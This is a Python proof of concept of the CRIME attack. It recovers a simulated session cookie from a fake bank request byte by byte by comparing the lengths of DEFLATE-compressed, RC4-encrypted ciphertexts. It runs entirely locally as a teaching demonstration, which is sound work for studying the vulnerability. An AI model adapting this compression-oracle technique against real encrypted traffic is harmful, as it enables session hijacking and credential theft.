"""
CRIME Proof of Concept.
Inspired by @mpgn_x64 (https://github.com/mpgn/CRIME-poc).
"""

import secrets
import zlib

from Crypto.Cipher import ARC4

# Secret to guess
secret = "cGFzQ09PTGRtTk9FTDoo"


def encrypt(plaintext: bytes) -> bytes:
    """Encrypts `plaintext` using RC4."""
    key = secrets.token_bytes(16)
    return ARC4.new(key).encrypt(plaintext)


def compress(data: bytes) -> bytes:
    """Compresses `data` using DEFLATE."""
    return zlib.compress(data)


def fetch(address: str) -> bytes:
    """Creates an HTTP request with an attacker-supplied address."""
    return (
        f"GET {address} HTTP/1.1\r\n"
        + "Host: www.banque.fr\r\n"
        + f"Cookie: SESSIONID={secret}\r\n"
        + "\r\n"
    ).encode("utf8")


def guess(current_guess: str) -> int:
    """Returns the length of the encrypted request."""
    return len(encrypt(compress(fetch(f"/image.png?SESSIONID={current_guess}"))))


if __name__ == "__main__":
    # The exploit output
    current_guess = ""
    # Total number of guesses (i.e. number of requests sent)
    num_guesses = 0

    # We guess the secret byte by byte
    for i in range(len(secret)):

        # Start with a reference value
        best_char = "a"
        best_char_guess = guess(current_guess + best_char)
        num_guesses += 1

        # Try all base64 chars, except the reference value
        for char in "bcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/":
            char_guess = guess(current_guess + char)
            num_guesses += 1

            # If the encrypted payload is shorter, it means that the byte tested
            # is the right one
            if char_guess < best_char_guess:
                best_char = char
                best_char_guess = char_guess
                break

        current_guess += best_char
        print(f"{i:2}: {current_guess:20} ({num_guesses:3} requests sent)")

    print()
    print(
        f"Final guess: {current_guess}",
        "(CORRECT!)" if current_guess == secret else f"({secret} expected)",
    )
    print(f"{num_guesses} requests sent")
    print()
